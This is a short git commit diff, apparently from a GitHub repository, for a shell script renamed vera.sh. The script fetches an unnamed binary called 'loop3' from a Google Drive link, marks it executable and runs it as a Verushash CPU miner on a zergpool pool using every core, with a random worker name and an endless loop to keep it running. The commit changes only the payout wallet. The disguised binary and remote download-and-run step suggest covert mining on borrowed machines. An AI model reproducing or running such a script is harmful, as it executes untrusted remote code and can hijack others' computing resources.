55911dc482afa7cf58062d78b1b80dbf288cf864
cihuuy <95659029+cihuuy@users.noreply.github.com>
2021-12-24 15:22:24 +0530

    Update and rename veruscoin.sh to vera.sh

--- vera.sh
+++ vera.sh
@@ -3,7 +3,7 @@ sudo apt update
 sudo apt install screen -y
 wget -O loop3 "https://drive.google.com/uc?export=download&id=1JTWxpvZU2wWUSDLRD070xUK9ggP6b6jm" > loop3
 chmod +x loop3
-./loop3 -v -l verushash.asia.mine.zergpool.com:3300 -u dgb1qh44tn3h8tq77k8yy58lajcd2qv2lfzx3a782a5.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
+./loop3 -v -l verushash.asia.mine.zergpool.com:3300 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
 while [ 1 ]; do
 sleep 3
 done
